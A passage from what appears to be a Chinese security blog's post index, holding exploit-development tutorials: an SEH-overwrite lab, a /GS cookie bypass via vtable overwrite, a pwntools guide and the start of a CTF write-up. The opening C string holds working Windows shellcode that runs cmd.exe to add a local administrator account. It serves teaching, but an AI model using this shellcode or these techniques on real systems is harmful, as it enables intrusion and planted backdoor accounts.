temp[2048];test(&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x31\\xd2\\xb2\\x30\\x64\\x8b\\x12\\x8b\\x52\\x0c\\x8b\\x52\\x1c\\x8b\\x42\\x08\\x8b\\x72\\x20\\x8b\\x12\\x80\\x7e\\x0c\\x33\\x75\\xf2\\x89\\xc7\\x03\\x78\\x3c\\x8b\\x57\\x78\\x01\\xc2\\x8b\\x7a\\x20\\x01\\xc7\\x31\\xed\\x8b\\x34\\xaf\\x01\\xc6\\x45\\x81\\x3e\\x57\\x69\\x6e\\x45\\x75\\xf2\\x8b\\x7a\\x24\\x01\\xc7\\x66\\x8b\\x2c\\x6f\\x8b\\x7a\\x1c\\x01\\xc7\\x8b\\x7c\\xaf\\xfc\\x01\\xc7\\x68\\x4b\\x33\\x6e\\x01\\x68\\x20\\x42\\x72\\x6f\\x68\\x2f\\x41\\x44\\x44\\x68\\x6f\\x72\\x73\\x20\\x68\\x74\\x72\\x61\\x74\\x68\\x69\\x6e\\x69\\x73\\x68\\x20\\x41\\x64\\x6d\\x68\\x72\\x6f\\x75\\x70\\x68\\x63\\x61\\x6c\\x67\\x68\\x74\\x20\\x6c\\x6f\\x68\\x26\\x20\\x6e\\x65\\x68\\x44\\x44\\x20\\x26\\x68\\x6e\\x20\\x2f\\x41\\x68\\x72\\x6f\\x4b\\x33\\x68\\x33\\x6e\\x20\\x42\\x68\\x42\\x72\\x6f\\x4b\\x68\\x73\\x65\\x72\\x20\\x68\\x65\\x74\\x20\\x75\\x68\\x2f\\x63\\x20\\x6e\\x68\\x65\\x78\\x65\\x20\\x68\\x63\\x6d\\x64\\x2e\\x89\\xe5\\xfe\\x4d\\x53\\x31\\xc0\\x50\\x55\\xff\\xd7\\xe9\\x39\\xff\\xff\\xff\\x90\\x90\\x90\\xeb\\xf6\\x90\\x90\\x31\\x12\\x40&quot;); return 0;&#125; 我们把返回地址覆盖为\\x90\\x90\\x90\\x90了，而这这地址不可执行，程序抛出异常。在pop pop retn指令地址下断点 00401231 . 59 POP ECX 然后Shift+F9把异常交给SEH 处理。程序会断在0x00401231处。 00401233 . C3 RETN 此时的esp为0x0018f328 也就说是接下来程序会到0x0018ff78执行。我们按下F8 这个就是nseh处的跳转指令，它又跳到nseh前八个字节处【注意当前指令地址0x0018ff78和jmp的目标地址0x0018ff70】继续F8。 又是一个跳转，这回跳到我们的shellcode，f8 放行程序，成功。","categories":[{"name":"PWN","slug":"PWN","permalink":"https://qianmuoy.github.io/categories/PWN/"}],"tags":[]},{"title":"突破GS","slug":"突破GS","date":"2024-03-09T12:36:32.000Z","updated":"2024-03-09T12:36:47.776Z","comments":true,"path":"2024/03/09/突破GS/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/%E7%AA%81%E7%A0%B4GS/","excerpt":"","text":"突破GS针对缓冲区溢出覆盖函数返回地址这一特征，微软在编译程序时候使用了一个很酷的安全编译选项—GS。&#x2F;GS 编译选项会在函数的开头和结尾添加代码来阻止对典型的栈溢出漏洞（字符串缓冲区）的利用。当应用程序启动时，程序的 cookie（4 字节（dword），无符号整型）被计算出来（伪随机数）并保存在 加载模块的.data 节中,在函数的开头这个 cookie 被拷贝到栈中，位于 EBP 和返回地址的正前方（位于返回地址和局部变量的中间）。 [局部变量 ] [cookie] [保存的EBP] [保存的返回地址] [参数] 在函数的结尾处，程序会把这个 cookie 和保存在.data 节中的 cookie 进行比较。 如果不相等，就说明进程栈被破坏，进程必须被终止。 为了演示覆盖虚表指针这种技术，将使用下面的代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &quot;stdafx.h&quot;#include &quot;windows.h&quot;class TestClass&#123; public: void __declspec(noinline) test1(char* src) &#123; char buf[8]; strcpy(buf, src); test2(); //调用虚函数test2 &#125; virtual void __declspec(noinline) test2() &#123; &#125;&#125;;int main()&#123; char str[8000]; LoadLibrary(_T(&quot;Netfairy.dll&quot;)); TestClass test; test.test1(&quot;AAAABBBBCCCCDDD&quot;); return 0;&#125; TestClass对象在 main 函数的堆栈中分配空间，并在 main 函数中被调用，然后对象test被做为参数传递给存在 漏洞的成员函数 test1（如果把大于 8 字节的字符串拷贝到 buf，buf 就会被溢出。）。 完成拷贝后，一个虚函数会被执行，因为前边的溢出，堆栈中指向虚函数表的指针可能已经被覆盖，这样 就可以把程序的执行流重定向到 shellcode 中。 用Olldbg载入程序，查看test1函数的代码 test1函数是受到GS保护的函数，在 00401006 A1 18304000 mov eax, dword ptr ds:[test.__security_cookie] 0040100B 33C5 xor eax, ebp 0040100D 8945 FC mov dword ptr ss:[ebp-4], eax 设置安全cookie。在 0040105E E8 54000000 call test.__security_check_cookie 进行检验，如果栈中的cookie被覆盖，那么程序将直接退出。但是我们注意到，在调用校验函数的时候，test1函数先调用了test2函数 00401057 FFD0 call eax ; test.TestClass::test2 而test2是虚函数，所以我们可以覆盖保存在栈中的虚表指针，间接跳到我们的shellcode。我们先执行到 **00401050 8B10 mov edx, dword ptr ds:[eax]**观察此时的eax为0x0018FF40，这个地址保存着虚表指针。 再执行到 00401057 FFD0 call eax ;test.TestClass::test2 当输入“AAAABBBBCCCCDDD”时，刚刚开始覆盖到返回地址。如果我们输入很多字符的时候，多到恰好能覆盖虚表指针那么我们就能控制程序。我们可以计算出多少字符能够覆盖到虚表指针 X&#x3D;0x0018ff40-0x0018dfe4&#x3D;0x1f60，十进制就是8028。我们可以试一下，把test.test1(“AAAABBBBCCCCDDD”);中的AAAABBBBCCCCDDD改为8028个A。重新编译，用OD调试，执行到 00401057 FFD0 call eax 可以看到8028个A刚好能覆盖到虚表指针。接下来就是构造利用了。找一个地址，这个地址保存的值指向我们的A。我们最好在没有开启ASLR的模块找，Netfairy.dll就是一个不错的选择。很快，我用Olldbg的搜索功能找到了一个 0x500295A2保存的0x0018E1E8指向我们的AAAAAA…。下来我们把虚表指针覆盖为0x500295A2，把8028个A替换为我们的shellcode，不足的用\\x90补充。务必记住，把shellcode放在0x0018E1E8之后，否则利用失败。 尽管堆栈中的 cookie 被破坏了，但我们依然劫持了 E I P（因为我们溢出了虚函数表指针，并控制了 eax），从而控制了程序的流程，执行了我们的shellcode。","categories":[{"name":"PWN","slug":"PWN","permalink":"https://qianmuoy.github.io/categories/PWN/"}],"tags":[]},{"title":"Pwntools","slug":"Pwntools","date":"2024-03-09T12:35:54.000Z","updated":"2024-03-09T12:36:06.932Z","comments":true,"path":"2024/03/09/Pwntools/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/Pwntools/","excerpt":"","text":"基于pwntools编写pwn代码背景pwntools是一个CTF框架和漏洞利用开发库，用Python开发，由rapid设计，旨在让使用者简单快速的编写exploit。 1.Pwntools安装及模块（已装） 1）安装 安装命令：pip install –upgrade pwntools 安装完毕后在python环境下只需使用 from pwn import * 即可导入 这会将大量的功能导入到全局命名空间，然后我们就可以直接使用单一的函数进行汇编、反汇编、pack,unpack等操作。 2）常用模块如下 asm：汇编与反汇编，支持x86&#x2F;x64&#x2F;arm&#x2F;mips&#x2F;powerpc等基本上所有的主流平台 dynelf：用于远程符号泄漏，需要提供leak方法 elf：对elf文件进行操作 gdb：配合gdb进行调试 memleak：用于内存泄漏 shellcraft：shellcode的生成器 tubes：包括tubes.sock,tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE utils：一些实用的小功能，例如CRC计算，cyclic pattern等 2.常用模块详细介绍 1）Tubes读写接口 这是exploit最为基础的部分，对于一次攻击而言前提就是与目标服务器或者程序进行交互，这里就可以使用remote（address, port）产生一个远程的socket然后就可以读写了。 先来看看pwntools建立连接的功能，在kali上开启ftp服务： service vsftpd start 这里是模拟了使用anonymous用户登录ftp服务的场景 pwntools还有创建监听器的功能，如下所示 上图中是自动监听41375端口，然后模仿发送hello消息，然后使用recv()进行接收。 通过pwnlib.tubes.process可以与进程进行交互 上图中是与&#x2F;bin&#x2F;sh进行交互，打印hello world 我们不单单可以通过编程的方式事先写好与进程交互的逻辑，还可以直接与进程交互 上图中通过interactive()进入了交互模式 无论哪种PIPE都是继承tube而来，可以用于读写函数主要有: interactive()：直接进行交互，相当于回到shell的模式，在取得shell之后使用 recv(numb&#x3D;4096, timeout&#x3D;default)：接收指定字节 recvall()：一直接收直到EOF recvline(keepends&#x3D;True)：接收一行，keepends为是否保留行尾的\\n recvuntil(delims, drop&#x3D;False)：一直读到delims的pattern出现为止 recvrepeat(timeout&#x3D;default)：持续接受直到EOF或timeout send(data)：发送数据 sendline(data)：发送一行数据，相当于在数据末尾加\\n 2）汇编与反汇编 使用asm进行汇编 使用disasm进行反汇编 1print disasm(&#x27;6a0258cd80ebf9&#x27;.decode(&#x27;hex&#x27;)) 3）shellcode生成器 使用shellcraft可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到 12print shellcraft.i386.nop().strip(&#x27;\\n&#x27;)print shellcraft.i386.linux.sh() 如上所示，如果需要在64位的Linux上执行&#x2F;bin&#x2F;sh就可以使用shellcraft.amd64.linux.sh()，配合asm函数就能够得到最终的pyaload了。 除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等。 4）elf文件操作 在进行elf文件逆向的时候，总是需要对各个符号的地址进行分析，elf模块提供了一种便捷的方法能够迅速的得到文件内函数的地址，plt位置以及got表的位置 下图分别是打印文件装载的基地址、函数地址、GOT表的地址、PLT表的地址 其他可用的函数还包括： asm(address, assembly)：在指定地址进行汇编 bss(offset)：返回bss段的位置，offset是偏移值 checksec()：对elf进行一些安全保护检查，例如NX,PIE等。 disasm(address, n_bytes)：在指定位置进行n_bytes个字节的反汇编 offset_to_vaddr(offset)：将文件中的偏移offset转换成虚拟地址VMA vaddr_to_offset(address)：与上面的函数作用相反 read(address, count)：在address(VMA)位置读取count个字节 write(address, data)：在address(VMA)位置写入data section(name)：dump出指定section的数据 5）ROP链生成器 回顾一下ROP的原理，由于NX开启不能在栈上执行shellcode，我们可以在栈上布置一系列的返回地址与参数，这样可以进行多次的函数调用，通过函数尾部的ret语句控制程序的流程，而用程序中的一些pop&#x2F;ret的代码块(称之为gadget)来平衡堆栈。其完成的事情无非就是放上&#x2F;bin&#x2F;sh，覆盖程序中某个函数的GOT为system的，然后ret到那个函数的plt就可以触发system(‘&#x2F;bin&#x2F;sh’)。由于是利用ret指令的exploit，所以叫Return-Oriented Programming。 这种技术的难点自然就是如何在栈上布置返回地址以及函数参数。而pwntools的ROP模块的作用，就是自动地寻找程序里的gadget，自动在栈上部署对应的参数。 使用ROP(elf)来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数 ROP对象实现了__getattr__的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。 其他常用函数包括： call(resolvable, arguments&#x3D;())：添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号) chain()：返回当前的字节序列，即payload dump()：直观地展示出当前的ropchain raw()：在rop chain中加上一个整数或字符串 search(move&#x3D;0, regs&#x3D;None, order&#x3D;’size’)：按特定条件搜索gadget，没仔细研究过 unresolve(value)：给出一个地址，反解析出符号 另外，对于整数的pack与数据的unpack，可以使用p32,p64,u32,u64这些函数，分别对应着32位和64位的整数 使用pwntools实战CTF题目题目来自RCTF2015,名为welpwn 先看看程序的基本信息 可以知道，这是64位linux下的二进制程序，无cookie 通过IDA静态分析 main函数 read()函数读取字节数为0x400,即十进制的1024，即read()读取1024个字节的数据，随后调用echo() 定位到echo() 可以看到echo函数的栈帧大小为20h echo的伪码 可以知道，echo函数中存在循环赋值，循环的次数为read函数读的数据的长度 由于echo函数的栈桢大小（20h）远小于read函数可以读取的数据长度(400h)，在进行循环赋值的时候，echo函数保存在栈中的返回地址会被覆盖。 整个程序逻辑是这样的，main函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以“x00”作为字符串终止符，故如果我们的payload中存在这个字符，则不会复制成功；但实际情况是，因为welpwn的NX为enabled,即设置了栈不可执行，所以我们需要构造ROP链，这样肯定会在payload中包含“x00”字符。 那么怎么绕过这个障碍呢？ 由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节（0x20h），故我们可以只复制过去24字节数据加上一个包含连续4个pop指令的gadget地址(8字节)，并借助这个gadget跳过原字符串的前32字节数据，即可进入我们正常的通用gadget调用过程。 绕过这个障碍后，解题思路就很清晰了： -泄露libc，获取system,gets等函数地址 